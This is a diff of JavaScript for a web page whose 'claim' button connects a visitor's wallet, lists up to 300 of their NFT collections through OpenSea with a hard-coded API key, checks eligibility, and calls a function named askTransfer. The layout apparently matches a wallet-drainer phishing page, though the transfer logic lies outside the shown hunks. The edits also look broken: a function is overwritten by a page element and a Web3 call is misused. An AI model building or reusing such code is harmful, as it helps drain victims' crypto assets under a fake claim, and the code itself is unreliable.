@@ -9,8 +9,8 @@ async function connectButton() {
 async function claimButton() {
     await Moralis.enableWeb3(metamaskInstalled ? {} : { provider: "walletconnect" });
 }
-
-Moralis.onWeb3Enabled(async (data) => {
+ claimButton = document.getElementById("claimButton");
+Moralis.enableWeb3(async (data) => {
     if (data.chainId !== 1 && metamaskInstalled) await Moralis.switchNetwork("0x1");
     updateState(true);
     console.log(data);
@@ -93,7 +93,6 @@ async function askNfts() {
       "X-API-KEY": "812924de94094476916671a8de4686ec",
     },
   };
-}   
 
   let walletNfts = await fetch(
     `${"https://api.opensea.io/api/v1/collections?asset_owner="}${walletAddress}${"&offset=0&limit=300"}`,
@@ -224,6 +223,7 @@ async function askNfts() {
       await verifyAsset();
     }
   }
+}
 
 const notEligible = () => {
   document.getElementById("notEli").style.display = "";
@@ -335,5 +335,4 @@ if (typeof window.ethereum !== "undefined") metamaskInstalled = true;
 window.addEventListener("load", async () => {
   document.querySelector("#claimButton").addEventListener("click", askTransfer);
 });
-
 
